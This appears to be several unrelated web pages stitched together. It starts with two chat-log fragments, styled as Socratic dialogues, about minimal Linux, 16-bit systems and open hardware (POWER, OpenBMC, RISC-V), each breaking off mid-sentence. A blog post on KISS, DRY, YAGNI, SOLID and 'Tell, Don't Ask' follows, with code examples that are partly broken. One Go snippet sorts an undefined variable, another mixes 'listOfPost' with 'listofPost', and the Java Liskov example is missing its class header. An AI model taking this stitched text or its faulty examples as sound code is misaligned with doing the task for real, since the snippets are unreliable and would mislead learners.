<strong>Glaucon:</strong> as long as it has make and a C compiler, I should be able to compile basic suckless tools/programs, right?<br>
<strong>Glaucon:</strong> <a href="https://tools.suckless.org/sic/">https://tools.suckless.org/sic/</a> like this?<br>
<strong>Socrates:</strong> so you’re happily running that and are in a Linux environment of some kind?<br>
<strong>Glaucon:</strong> Uh, I haven’t installed it, if that’s what you’re asking<br>
<strong>Glaucon:</strong> But I’m considering it, if I can compile basic programs like this without much issue<br>
<strong>Socrates:</strong> OK, I’ll give you this answer really simply, but I don’t think it will help you<br>
<strong>Socrates:</strong> if you have some C source code that has no build or runtime dependencies, then yes, all you need is a toolchain (compiler+friends), and any build automation tools (like <code>make</code>)<br>
<strong>Glaucon:</strong> so since most suckless tools are written in straight C, I should be able to compile them without much issue?<br>
<strong>Socrates:</strong> “yes”<br>
<strong>Thrasymachus:</strong> Haha<br>
<strong>Glaucon:</strong> it will be a big issue, I understand, Thrasymachus<br>
<strong>Glaucon:</strong> and it won’t be that simple<br>
<strong>Glaucon:</strong> but in theory, it might work<br>
<strong>Thrasymachus:</strong> I’m not making fun of you; I still don’t fully understand why you insist on making things so hard for yourself—it’s perverse and weird—but I’m laughing with recognition at Socrates’s double-quoting “what should be” as opposed to “what is”</p>

<h2 id="practical-and-portable-c">Practical and portable C</h2>

<p><strong>Socrates:</strong> if you’re in a reduced version of Linux<br>
<strong>Socrates:</strong> and running in 16 bit mode<br>
<strong>Socrates:</strong> the suckless source will need to be appropriately portable to this environment<br>
<strong>Socrates:</strong> the jump is presumably much smaller than, say, Linux to Windows<br>
<strong>Socrates:</strong> but presumably larger than between Debian and Ubuntu<br>
<strong>Glaucon:</strong> I was fine in DOS, I just needed multitasking, and applying a multitasking environment over it seemed like a sillier solution than just finding a reduced Linux like this one<br>
<strong>Glaucon:</strong> for reference, I don’t plan on compiling any software that won’t work in the command line<br>
<strong>Glaucon:</strong> maybe at most a browser and video player that needs the framebuffer<br>
<strong>Socrates:</strong> it’s not the front end I’m worried about<br>
<strong>Socrates:</strong> it’s if suckless source code makes any assumptions that expect to be on a 32 bit system<br>
<strong>Socrates:</strong> i.e., any modern system<br>
<strong>Glaucon:</strong> that was the question<br>
<strong>Socrates:</strong> suckless is quite aggressive at targeting the minimal, common case<br>
<strong>Glaucon:</strong> but they still usually presume a 386<br>
<strong>Glaucon:</strong> from what I can tell<br>
<strong>Socrates:</strong> that is to say, it’s quite possible they will not support running in legacy 16 bit environments<br>
<strong>Glaucon:</strong> yeah<br>
<strong>Socrates:</strong> remember that running isn’t the same as working<br>
<strong>Glaucon:</strong> There is good news, though: I got a lot of modern programs working just fine in DOS without EMM<br>
<strong>Glaucon:</strong> such as links, and an audio player<br>
<strong>Socrates:</strong> if they exist, make sure to run the tests<br>
<strong>Glaucon:</strong> if what exists?<br>
<strong>Socrates:</strong> tests<br>
<strong>Socrates:</strong> consider how much of a hassle it has been to upgrade Linux to go from 32-bit <code>time_t</code>s to 64-bit <code>time_t</code>s<br>
<strong>Socrates:</strong> and now you want to change things as fundamental as the width of a pointer<br>
<strong>Socrates:</strong> just remember that there are things that will run, but not always work. unless you have made a deliberate effort to port and audit, it’s possible for stuff to fuck up in quiet, insidious ways<br>
<strong>Glaucon:</strong> My guess is<br>
<strong>Glaucon:</strong> tools like ii, sic, lynx/links, mutt, this won’t be a problem<br>
<strong>Glaucon:</strong> and then anything beyond that will probably not work<br>
<strong>Thrasymachus:</strong> You don’t know how to compile a program and you think you can guess what will and won’t work on a 16-bit computer?<br>
<strong>Glaucon:</strong> well yes<br>
<strong>Glaucon:</strong> because those are tools that have been ported to DOS<br>
<strong>Glaucon:</strong> and run without memory management<br>
<strong>Glaucon:</strong> all of them except ii and sic, and sic is only 5kb filesize so<br>
<strong>Socrates:</strong> OK<br>
<strong>Socrates:</strong> best of luck, Godspeed, and be sure to document and report back<br>
<strong>Socrates:</strong> for a moment, when you linked ELKS, I was expecting you to say “I need to build this in FreeDOS to embed Linux programs”<br>
<strong>Socrates:</strong> and I was going to say “no”<br>
<strong>Socrates:</strong> have you considered something sane like plan 9?<br>
<strong>Socrates:</strong> (there’s a cursed phrase)<br>
<strong>Glaucon:</strong> I have, but plan 9 has more graphical focus than I want/need<br>
<strong>Socrates:</strong> wild concept right there<br>
<strong>Socrates:</strong> I’m not sure I agree but OK<br>
<strong>Socrates:</strong> if you mean “it uses a mouse”, yes, it’s quite mouse reliant<br>
<strong>Socrates:</strong> but almost everything is text<br>
<strong>Socrates:</strong> I can recommend 9front if you want to play, it will run happily in QEMU but I get the feeling you’re never going to run a system bloated enough to include other systems<br>
<strong>Glaucon:</strong> I don’t like using a mouse<br>
<strong>Glaucon:</strong> Remember I’ve been using all CLI tools plus like, Links for web browsing<br>
<strong>Glaucon:</strong> so I actually unplugged my mouse while using FreeDOS yesterday just so I didn’t even need the mouse driver running in the background<br>
<strong>Glaucon:</strong> there’s simply no reason for me to use a mouse, the only graphical thing I use is a web browser and I can browse with links/surf/whatever just fine with keyboard commands<br>
<strong>Thrasymachus:</strong> You are very strange<br>
<strong>Glaucon:</strong> I’m really not</p>

<h2 id="the-road-less-travelled-by-for-a-reason">The road less travelled by, for a reason</h2>

<p><strong>Cephalus:</strong> what web browser are you on right now<br>
<strong>Glaucon:</strong> Chrome on a Windows 10 laptop<br>
<strong>Glaucon:</strong> lmao<br>
<strong>Glaucon:</strong> because MINIX wiped my FreeDOS install but couldn’t finish installing itself<br>
<strong>Adeimantus:</strong> no, you wiped your FreeDOS install<br>
<strong>Adeimantus:</strong> don’t blame poor ol’ MINIX<br>
<strong>Glaucon:</strong> I do blame MINIX<br>
<strong>Cephalus:</strong> tbh MINIX is a bit rough around the edges<br>
<strong>Cephalus:</strong> best to assume it’ll do bad things<br>
<strong>Adeimantus:</strong> it just did what you told it to<br>
<strong>Glaucon:</strong> I can hardly even login with the live CD, it crashes 50% of the time while booting<br>
<strong>Glaucon:</strong> shit’s broken, tbh<br>
<strong>Thrasymachus:</strong> I just… I just don’t get it<br>
<strong>Thrasymachus:</strong> You do the strangest, most difficult thing at every possible turn and then are baffled when it doesn’t work<br>
<strong>Adeimantus:</strong> glaucon.txt<br>
<strong>Glaucon:</strong> I’m not baffled that MINIX doesn’t work, who said I was baffled<br>
<strong>Glaucon:</strong> it’s MINIX, of course it’s broken<br>
<strong>Socrates:</strong> MINIX runs on more systems than windows, you cheeky cunt<br>
<strong>Adeimantus:</strong> if you knew it was broken, why did you install it to begin with?<br>
<strong>Glaucon:</strong> because I expected to at least be able to install it and compile basic programs, but alas<br>
<strong>Glaucon:</strong> I’m surprised however that NetBSD kernel panicked on every live CD boot<br>
<strong>Glaucon:</strong> the default boot is without<br>
<strong>Thrasymachus:</strong> The sooner Glaucon realises he needs to install Ubuntu and learn how to <code>echo</code> and <code>cd</code>, the happier he will be<br>
<strong>Adeimantus:</strong> ^<br>
<strong>Thrasymachus:</strong> But it looks like it’s going to take a long time<br>
<strong>Glaucon:</strong> &gt;install Ubuntu<br>
<strong>Glaucon:</strong> I don’t understand why I wouldn’t just use BSD or Void like an adult<br>
<strong>Adeimantus:</strong> because you’re <em>not</em> an adult<br>
<strong>Adeimantus:</strong> &gt;<code>apt install build-essential</code><br>
<strong>Adeimantus:</strong> “look ma I can compile shit”<br>
<strong>Glaucon:</strong> Although, since NetBSD is borked, and I …</p></div></div>

				<h2 id="introduction">Introduction</h2>

<p>Glaucon joins the agora with its usual 30–40 patrons present, most of whom are idling or spectating.  Glaucon has ambitious and unusual goals for his computing environment, and high standards of openness and freedom for the hardware he wants to use, but isn’t sure where to start implementing what he wants.  Socrates, one of the regulars, having experience in this area, explains to Glaucon some of the subtleties of hardware being “open” or “closed”, and clears up some surprising misconceptions that Glaucon likely shares with others in his position.</p>

<h2 id="dramatis-personae">Dramatis personae</h2>

<p>In order of appearance:</p>

<ul>
  <li><strong>Glaucon:</strong> A Cretin visitor to the agora, with grand ideals of freedom and minimalism in computing</li>
  <li><strong>Thrasymachus:</strong> A self-taught Ithacan sysadmin with no engineering knowledge</li>
  <li><strong>Socrates:</strong> Famed philosopher-engineer of Athens</li>
  <li><strong>Adeimantus:</strong> Another Cretin, a regular visitor, impatient with his countryman’s idealism</li>
  <li><strong>Polemarchus:</strong> A Spartan</li>
</ul>

<h2 id="prelude">Prelude</h2>

<p><strong>Glaucon:</strong> why hello<br>
<strong>Glaucon:</strong> I need some help with something <br>
<strong>Glaucon:</strong> Does anyone know of any completely free hardware computers? I’m looking and I can’t find any<br>
<strong>Thrasymachus:</strong> Who wants to tell him<br>
<strong>Glaucon:</strong> I thought there were at least one or two<br>
<strong>Glaucon:</strong> like a weak 16-bit/32-bit one at least<br>
<strong>Socrates:</strong> Thrasymachus: why didn’t you mention POWER?<br>
<strong>Thrasymachus:</strong> ?<br>
<strong>Socrates:</strong> POWER is a remarkably open architecture<br>
<strong>Thrasymachus:</strong> I wonder if it would meet Glaucon’s high standards<br>
<strong>Adeimantus:</strong> it’s too new<br>
<strong>Adeimantus:</strong> only the oldest workable tech will do, because performance is bloat<br>
<strong>Socrates:</strong> Thinkpad with pre-ME CPU, Libreboot, and Trisquel<br>
<strong>Socrates:</strong> no networking because I haven’t found an ISP that will give me the source to their CRM<br>
<strong>Glaucon:</strong> people on /g/ are saying system76 but that’s not at all what I’m looking for<br>
<strong>Glaucon:</strong> they’re all Intel or AMD CPUs<br>
<strong>Glaucon:</strong> Pinebook is closer</p>

<strong>Socrates:</strong> POWER arch, auditable/disablable management<br>
<strong>Glaucon:</strong> this is exactly what I was looking for<br>
<strong>Thrasymachus:</strong> Socrates wins<br>
<strong>Glaucon:</strong> management?<br>
<strong>Glaucon:</strong> like IME?<br>
<strong>Socrates:</strong> OpenBMC<br>
<strong>Socrates:</strong> <a href="https://github.com/openbmc/openbmc">https://github.com/openbmc/openbmc</a><br>
<strong>Glaucon:</strong> this is its own OS?<br>
<strong>Glaucon:</strong> I’m still a bit lost<br>
<strong>Socrates:</strong> Intel ME is a small CPU tacked on the side running Minix<br>
<strong>Socrates:</strong> like it or not, management is actually pretty cool and useful<br>
<strong>Socrates:</strong> the reason why ME is shit is because it’s not owned by you, so while you can control it (and it is useful for everybody), people don’t trust Intel to make it secure and safe against economic/political pressures<br>
<strong>Glaucon:</strong> what if I wanted to avoid it entirely<br>
<strong>Glaucon:</strong> that’s why I bought a 2003 Tower to begin with<br>
<strong>Socrates:</strong> then disable it<br>
<strong>Glaucon:</strong> there must be an option to have it not be there at all<br>
<strong>Socrates:</strong> probably, if you email them they’ll probably ship it nulled out<br>
<strong>Socrates:</strong> or give you instructions on how to do the same<br>
<strong>Glaucon:</strong> do you know of any other boards like this you could link?<br>
<strong>Socrates:</strong> nothing at this level ships without management<br>
<strong>Socrates:</strong> (its not inherently bad)<br>
<strong>Socrates:</strong> its basically just Wake-on-LAN but extended<br>
<strong>Glaucon:</strong> what does ship without management<br>
<strong>Socrates:</strong> to get stuff that ships without management you have to go into the low end devices that are used by people who don’t care about openness<br>
<strong>Socrates:</strong> but genuinely, management is orthogonal to openness/security<br>
<strong>Glaucon:</strong> such as?<br>
<strong>Glaucon:</strong> ah shit, this board is $4k<br>
<strong>Glaucon:</strong> lmao<br>
<strong>Socrates:</strong> I mean, if you buy old pre-ME business laptops, they’re probably the best trade-off between good devices<br>
<strong>Glaucon:</strong> that’s what I figured<br>
<strong>Socrates:</strong> but really, don’t ask for “no management”, ask for management you can control<br>
<strong>Socrates:</strong> its the difference between &lt;manufacturer BIOS&gt; and Libreboot, etc<br>
<strong>Socrates:</strong> <a href="https://en.wikipedia.org/wiki/OpenBMC">https://en.wikipedia.org/wiki/OpenBMC</a> is probably a better explanation<br>
<strong>Glaucon:</strong> so there essentially aren’t affordable options for open source CPUs at all<br>
<strong>Socrates:</strong> OpenPOWER<br>
<strong>Socrates:</strong> as was linked<br>
<strong>Socrates:</strong> if you want to wait another decade, we might get some traction in RISC-V<br>
<strong>Socrates:</strong> but for now, RISC-V competes with ARM, not Intel/AMD<br>
<strong>Glaucon:</strong> that thing was 4000 bux<br>
<strong>Socrates:</strong> listen bud freedom doesn’t come free<br>
<strong>Socrates:</strong> <a href="https://fglt.nl/assets/img/agora/freedom-aint-free.jpg">https://i.kym-cdn.com/photos/images/newsfeed/000/856/704/8b2.jpg</a><br>
<strong>Glaucon:</strong> praise Jesus<br>
<strong>Thrasymachus:</strong> fugg</p>

<h2 id="the-economics-of-open-hardware">The economics of open hardware</h2>

<p><strong>Glaucon:</strong> I don’t understand why I can’t get an SBC with an open source CPU<br>
<strong>Socrates:</strong> that’s because you don’t understand market economics, but that’s ok<br>
<strong>Socrates:</strong> if SBC grade is what you’re looking for, you can get RISC-V now for a shit perf:$ ratio, but a low absolute cost<br>
<strong>Glaucon:</strong> okay<br>
<strong>Glaucon:</strong> but a few hundred dollars would be possible<br>
<strong>Glaucon:</strong> not just 4k<br>
<strong>Socrates:</strong> probably we’re talking Raspberry Pi perf for the cost of a decent laptop<br>
<strong>Glaucon:</strong> yeah that’s reasonable<br>
<strong>Socrates:</strong> and no software support<br>
<strong>Socrates:</strong> <a href="https://www.sifive.com/boards">https://www.sifive.com/boards</a><br>
<strong>Thrasymachus:</strong> I think I need to learn something about RISC-V<br>
<strong>Socrates:</strong> basically just imagine the ARM product line but open source<br>
<strong>Thrasymachus:</strong> I ain’t mad at that<br>
<strong>Socrates:</strong> looks like you can get an unleashed board for ~$1000<br>
<strong>Glaucon:</strong> still a bit high<br>
<strong>Glaucon:</strong> but much more reasonable<br>
<strong>Glaucon:</strong> maybe I’ll take the dive eventually<br>
<strong>Socrates:</strong> sadly, that’s the two ends of the spectrum right now<br>
<strong>Glaucon:</strong> It’s getting better<br>
<strong>Socrates:</strong> you can get an Raspberry Pi for $1000, or you can get a POWER workstation for $5000<br>
<strong>Glaucon:</strong> I might just get one of those Rockchip SBCs instead<br>
<strong>Glaucon:</strong> or ARM SBCs<br>
<strong>Glaucon:</strong> I don’t have 1000 bux to drop on a PC I want to use rarely<br>
<strong>Socrates:</strong> Rockchip is ARM<br>
<strong>Glaucon:</strong> right<br>
<strong>Glaucon:</strong> well either way<br>
<strong>Socrates:</strong> is Mali open source?<br>
<strong>Socrates:</strong> I thought it needed blobs<br>
<strong>Socrates:</strong> oh, ARM give you some open source userspace drivers<br>
<strong>Socrates:</strong> standby for 0 perf lmoa :(((<br>
<strong>Glaucon:</strong> if I was gonna just get an ARM SBC do you have any suggestions<br>
<strong>Glaucon:</strong> I know the banana pi is mostly open software/hardware<br>
<strong>Socrates:</strong> what’s your use case?<br>
<strong>Glaucon:</strong> I need about 1GHz CPU and 1-2GB of RAM, I’ve been using an old 2003 Dell Tower for minimalist Linux, right now Alpine, and a simple web browser, text-based email client, text-based torrent client, text-based IRC client, and like mpv or something<br>
<strong>Glaucon:</strong> that’s about it<br>
<strong>Socrates:</strong> no, tell me your use case<br>
<strong>Glaucon:</strong> that’s my use case<br>
<strong>Socrates:</strong> what you’re upgrading from<br>
<strong>Glaucon:</strong> I don’t understand<br>
<strong>Glaucon:</strong> that’s what I’m upgrading from, that tower, do you want the model<br>
<strong>Socrates:</strong> ok<br>
<strong>Socrates:</strong> just get whatever the most-FOSS SBC you can find is<br>
<strong>Socrates:</strong> but just remember that half of them aren’t actually FOSS<br>
<strong>Socrates:</strong> (either because they are crippled when running FOSS only, or they ship violating blobs)<br>
<strong>Thrasymachus:</strong> Way to crush his dreams, Socrates<br>
<strong>Glaucon:</strong> yeah it’s not a great situation right now<br>
<strong>Socrates:</strong> Thrasymachus: he wants everything for nothing, the only solution they have is to pay and support showing that its a workable market, or to just deal with compromise<br>
<strong>Socrates:</strong> or sit on his hands and hope the rest of the world carries them I guess<br>
<strong>Glaucon:</strong> <a href="http://nonfree.pizza/">http://nonfree.pizza/</a><br>
<strong>Glaucon:</strong> I don’t want everything for nothing<br>
<strong>Glaucon:</strong> I want to know what my options are<br>
<strong>Glaucon:</strong> I don’t know much about open source hardware so I’m learning<br>
<strong>Glaucon:</strong> I only just jumped off from using Windows 10 daily lmao<br>
<strong>Socrates:</strong> I really suggest you understand what management is though, because you went from “I don’t know where OpenBMC sits in the stack” to “management bad”<br>
<strong>Socrates:</strong> so you p much only know the “IME is bad” bit of the story, which is absolutely true, but only one page of a very large book<br>
<strong>Glaucon:</strong> I never said management bad<br>
<strong>Glaucon:</strong> I asked if there was anything I could get with no management<br>
<strong>Glaucon:</strong> to understand the range of these devices<br>
<strong>Socrates:</strong> you said you didn’t want management at all, which pigeonholes you to “very old” or “very low end”<br>
<strong>Glaucon:</strong> I don’t mind very old<br>
<strong>Glaucon:</strong> the problem is very old is often very proprietary as well<br>
<strong>Socrates:</strong> management is now the default, so you need to make some compromise: remove it, at cost, or pick something old, at a performance penalty, or pick something low end, at a perf penalty, or pick something where the management is open, at a cost<br>
<strong>Glaucon:</strong> I also wanna avoid x86 bc then I can pigeonhole myself into only using Linux/BSD<br>
<strong>Socrates:</strong> interesting statement<br>
<strong>Socrates:</strong> pick x86_64 and you get to run anything, including a better range of Linux, and other interesting stuff like Haiku, Plan 9, etc<br>
<strong>Glaucon:</strong> that’s the opposite of what I want<br>
<strong>Glaucon:</strong> I don’t want to run anything<br>
<strong>Glaucon:</strong> if I did I’d have kept my gaming PC<br>
<strong>Adeimantus:</strong> then why are you even here?<br>
<strong>Socrates:</strong> ascetic minimalism and restriction comes at the cost of your own experience<br>
<strong>Glaucon:</strong> perfect<br>
<strong>Glaucon:</strong> that’s exactly what I want<br>
<strong>Socrates:</strong> then get a Filofax and some stamps<br>
<strong>Socrates:</strong> the computing world is not for you<br>
<strong>Socrates:</strong> you’ve been had, and you’re taking the /g/ minimal desktop thread meme way too hard<br>
<strong>Glaucon:</strong> nah, I’m enjoying myself<br>
<strong>Glaucon:</strong> I just want to take the next step and get more open hardware<br>
<strong>Socrates:</strong> well<br>
<strong>Socrates:</strong> you say that but you’re not willing to take what comes with that<br>
<strong>Socrates:</strong> buying cheap SBCs is usually non-free, even when they have “FOSS” on the sticker<br>
<strong>Socrates:</strong> usually by taking the allwinner route<br>
<strong>Glaucon:</strong> because it doesn’t have to be expensive<br>
<strong>Glaucon:</strong> it is currently<br>
<strong>Socrates:</strong> the only way to make it not expensive is to support the market now<br>
<strong>Adeimantus:</strong> it has to be expensive when you have low demand and high costs due to lack of scale<br>
<strong>Glaucon:</strong> nah<br>
<strong>Socrates:</strong> like, Raptor are seriously, seriously thinking about pulling from the market<br>
<strong>Socrates:</strong> because they cant make the economics work<br>
<strong>Socrates:</strong> because of what Adeimantus said<br>
<strong>Glaucon:</strong> then buy it yourself? I’m not gonna buy a 1000 dollar PC<br>
<strong>Glaucon:</strong> it doesn’t have to cost that much<br>
<strong>Socrates:</strong> like I said, you don’t …</p></div></div>

                <p>Confused? Well, this is no where related to actual real life kiss 😂</p>

<p>“Solid, DRY, KISS. YAGNI” are few of the software engineering principles we will be discussing today.</p>

<h3 id="why-should-i-learn-these">Why should I learn these?</h3>

<p>These principles are set of guidelines which help you write better, robust and clean code. Once, you start applying them, you’ll start seeing the results on the overall process of developing products. Here are some advantages which will be visible in your code -</p>

<ul>
  <li>Robustness</li>
  <li>Efficiency</li>
  <li><a href="https://www.amazon.in/Clean-Code-Handbook-Software-Craftsmanship/dp/0132350882">Clean Code</a></li>
  <li>Delivering high quality softwares</li>
  <li>Flexible, Easy to refactor</li>
</ul>

<blockquote>
  <p><em>Writing code is easy but writing good and quality code is hard</em></p>
</blockquote>

<p>In this post, I’ll be introducing a few I have learnt in my past year of professional software development career.</p>

<h2 id="principles">Principles</h2>

<ul>
  <li>KISS</li>
  <li>DRY</li>
  <li>YAGNI</li>
  <li>SOLID</li>
  <li>Tell, Don’t Ask!</li>
</ul>

<blockquote>
  <p><em>Simplicity is prerequisite for reliability. — Edsger Dijkstra</em></p>
</blockquote>

<hr>

<h3 id="kiss">KISS</h3>

<p>KISS is an acronym for <strong>“Keep It Simple Stupid”</strong>
This principle literally means to keep your code as simple code as possible.</p>

<p>You might think - “But, I always keep it simple only !?”</p>

<p>Well, that is not the case with a lot of engineers. You start with something basic but soon add unwanted complexity as the code grows.</p>

<blockquote>
  <p><em>Engineers like to complicate things!</em></p>
</blockquote>

<p>The simpler the code, the easier it is to understand and maintain it.</p>

<p>A very basic example of this would be adding a complex sort function when simple library sort would cater your need! Don’t optimize unless there is an requirement.</p>

<p>Another common violation of KISS is using a new framework or adding a new npm module in your code which can be easily avoided. Eg. There is a npm package to <a href="https://github.com/ianstormtaylor/to-camel-case">convert string to camel case</a>. Think, do you actually need this or a simple function would solve your task?</p>

<p>As soon as you add a new dependency, you are basically increasing the overall code complexity which will be problamatic in future.</p>

<blockquote>
  <p><em>Key to following this principle is learn to break your problem into as simple and small steps as possible, then write minimal code to implement them.</em></p>
</blockquote>

<hr>

<h3 id="dry">DRY</h3>

<p>DRY stands for <strong>“Don’t Repeat Yourself”</strong></p>

<p>This principle focuses on applying reusuability and reducing repitition in code. This implies you should not require a change in logically unrelated components on changing a certain single element.</p>

<p>When you reuse components you basically are reducing code to be written. Less code results in better maintainibility!</p>

<blockquote>
  <p>As an engineer, Automate and Reuse whenever you can!</p>
</blockquote>

<p>Most common example of these are functions! A general rule is if you are writing same logic more than thrice, it’s time to refactor the logic to a function and reuse!</p>

<p>Database normalization is one of the methods to reduce redundancy of data by eliminating columns. This is an example of DRY!</p>

<hr>

<h3 id="yagni">YAGNI</h3>

<p>YAGNI is an acronym for <strong>“You aren’t gonna need it”</strong></p>

<p>This principle states that you should not optimize and increase complexity thinking about future.</p>

<blockquote>
  <p>Do what is required now. Don’t optimize prematurely!</p>
</blockquote>

<p>Also, you don’t know what new cases may arise ahead! Why waste additional time and effort on something which is not actually required! Although, you should design your systems in a way that minimal changes are required for a future predictable change.</p>

<p>It syncs with KISS principle on avoiding any additional complexity.</p>

<p>A simple example would be not not use databases when simple file system can work!</p>

<hr>

<h3 id="solid">SOLID</h3>

<p>This principle in acronym of acronyms 😛</p>

<ul>
  <li><strong>S</strong>RP - Single Responsibility Principle</li>
  <li><strong>O</strong>CP - Open Closed Principle</li>
  <li><strong>L</strong>SP - Liskov Substitution Principle</li>
  <li><strong>I</strong>SP - Interface Segregation Principle</li>
  <li><strong>D</strong>IP - Dependency Inversion Principle</li>
</ul>

<hr>

<h4 id="single-responsibility">Single Responsibility</h4>

<p>Definition from <a href="https://en.wikipedia.org/wiki/Single_responsibility_principle">Wikipedia</a> is quite clear -</p>

<blockquote>
  <p>Every module or class should have responsibility over a single part of the functionality provided by the software, and that responsibility should be entirely encapsulated by the class</p>
</blockquote>

<p>Each method or class should be bounded to some functionality. It should not do anything less or more. There should be only a single reason for it to change!</p>

<p>Example - <code>Login</code> package should deal with the user login code, It should not deal with user signup.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>func</span> <span>showPosts</span><span>(</span><span>listOfPost</span> <span>[]</span><span>string</span><span>)</span> <span>{</span>
 <span>sort</span><span>.</span><span>Strings</span><span>(</span><span>strs</span><span>)</span> <span>// Basically any code dealing with sorting</span>
 <span>for</span> <span>_</span><span>,</span> <span>post</span> <span>:=</span> <span>range</span> <span>listOfPost</span> <span>{</span>
  <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>post</span><span>)</span>
 <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above code violates SRP, because there are reasons to change <code>showPosts()</code> if our sorting logic changes. Correct way would be to call sort function and then pass sorted list to this method.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td><pre><span>func</span> <span>showPosts</span><span>(</span><span>listOfPost</span> <span>[]</span><span>string</span><span>)</span> <span>{</span>
 <span>for</span> <span>_</span><span>,</span> <span>post</span> <span>:=</span> <span>range</span> <span>listOfPost</span> <span>{</span>
  <span>fmt</span><span>.</span><span>Println</span><span>(</span><span>post</span><span>)</span>
 <span>}</span>
<span>}</span>

<span>// In some other function</span>
<span>listOfPost</span> <span>:=</span> <span>[]</span><span>string</span><span>{</span> <span>"post1"</span><span>,</span> <span>"post2"</span><span>}</span> <span>// Some array list</span>
<span>// sort the list</span>
<span>sort</span><span>.</span><span>Strings</span><span>(</span><span>listofPost</span><span>)</span>
<span>// show the list</span>
<span>showPosts</span><span>(</span><span>listofPost</span><span>)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now, the <code>showPosts</code> only changes when we want to show additional info about post. (Single reason to change)</p>

<hr>

<h4 id="openclosed-principle">Open/Closed Principle</h4>

<p>Once you have written a piece of code and then some new features comes, now you have to go back to old code and change it again! Open/Closed principle exactly deals with this!</p>

<p>Write code in a way so that your classes/methods are -</p>

<blockquote>
  <p><em>Open for extension, but closed for modification</em></p>
</blockquote>

<hr>

<h4 id="liskov-substitution-principle">Liskov Substitution Principle</h4>

<p>LSP advocates that the objects of your subclass should behave in the same way as the objects of your superclass.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1

   <span>void</span> <span>setSpeed</span><span>(</span><span>double</span> <span>d</span><span>)</span> <span>{</span> <span>...</span> <span>}</span>

   <span>Engine</span> <span>engine</span><span>;</span>
   <span>Engine</span> <span>getEngine</span><span>()</span> <span>{</span> <span>...</span> <span>}</span>
   <span>void</span> <span>setEngine</span><span>(</span><span>Engine</span> <span>e</span><span>)</span> <span>{</span> <span>...</span> <span>}</span>

   <span>void</span> <span>startEngine</span><span>()</span> <span>{</span> <span>...</span> <span>}</span>
<span>}</span>

<span>class</span> <span>Car</span> <span>extends</span> <span>Vehicle</span>
<span>{</span>
   <span>@Override</span>
   <span>void</span> <span>startEngine</span><span>()</span> <span>{</span>
    <span>// start the car engine</span>
   <span>}</span>
<span>}</span>

<span>class</span> <span>Bicycle</span> <span>extends</span> <span>Vehicle</span>
<span>{</span>
   <span>@Override</span>
   <span>void</span> <span>startEngine</span><span>()</span> <span>{</span>
    <span>// throw error - Bicycle has no engine</span>
   <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>In the above example <code>Car</code> and <code>Bicycle</code> both extend the <code>Vehicle</code> class. This fails LSP because the Bicycle object cannot replace Vehicle since its <code>startEngine()</code> will return an error!</p>

<hr>

<h4 id="interface-segregation-principle">Interface Segregation Principle</h4>

<blockquote>
  <p><em>Clients should not be forced to depend upon interfaces that they do not use.</em> - Robert C. Martin</p>
</blockquote>

<p>This implies you should keep your interfaces as small as possible. Don’t pollute your interfaces with methods that are not required.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12

16
17
</pre></td><td><pre><span>interface</span> <span>Animals</span> <span>{</span>
    <span>public</span> <span>void</span> <span>eat</span><span>();</span>
    <span>public</span> <span>void</span> <span>fly</span><span>();</span>
    <span>public</span> <span>void</span> <span>swim</span><span>();</span>
<span>}</span>

<span>class</span> <span>Dogs</span> <span>implements</span> <span>Animals</span> <span>{</span>
    <span>public</span> <span>void</span> <span>fly</span><span>()</span> <span>{</span>
       <span>// Throws error - dogs cannot fly</span>
    <span>}</span>
    <span>public</span> <span>void</span> <span>swim</span><span>()</span> <span>{</span>
    <span>// Throws error - dogs cannot swim</span>
    <span>}</span>
    <span>public</span> <span>void</span> <span>eat</span><span>()</span> <span>{</span>
      <span>System</span><span>.</span><span>out</span><span>.</span><span>println</span><span>(</span><span>"Dogs eat!"</span><span>);</span>
    <span>}</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>In this case, our interface is polluted with methods like swim and fly which doesn’t apply to <code>Dog</code> class. We can fix this by breaking our interace into multiple interfaces like <code>AnimalsWhoSwim</code> and <code>AnimalsWhoFly</code>. Animals interface can contain function <code>eat()</code></p>

<hr>

<h4 id="dependency-inversion-principle">Dependency Inversion Principle</h4>

<p>DIP basically suggests that the high level modules should not depend on low level modules, rather <strong>both should depend on abstractions</strong>. It implies you should use interfaces instead of concrete implementations wherever possible.</p>

<p>There is a <a href="https://www.tutorialsteacher.com/ioc/dependency-inversion-principle">good example</a> on this, will guide you there in case you want to understand it better.</p>

<hr>

<h3 id="tell-dont-ask">Tell, Don’t Ask</h3>

<p>Tell, don’t ask principle suggests to avoid asking object about their state, rather tell them what to do based on decision i.e tell the object what to do!</p>

<h4 id="example">Example</h4>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
</pre></td><td><pre><span>// isLoggedIn returns true/false</span>
<span>if</span> <span>user</span><span>.</span><span>isLoggedIn</span><span>()</span> <span>{</span>  <span>// Asking whether user is logged in</span>
<span>user</span><span>.</span><span>showProfile</span><span>()</span>
<span>}</span> <span>else</span> <span>{</span>
<span>user</span><span>.</span><span>showLoginScreen</span><span>()</span>
<span>}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Here, we are asking whether the user is logged in or not, and then asking for profile. We wanted to get the profile, we just tell the object to show us thr profile, the login check should be internally implemented in <code>showProfile()</code> itself. The correct way should be -</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre><span>user</span><span>.</span><span>showProfile</span><span>()</span> <span>// Tell!</span>
</pre></td></tr></tbody></table></code></pre></div></div>

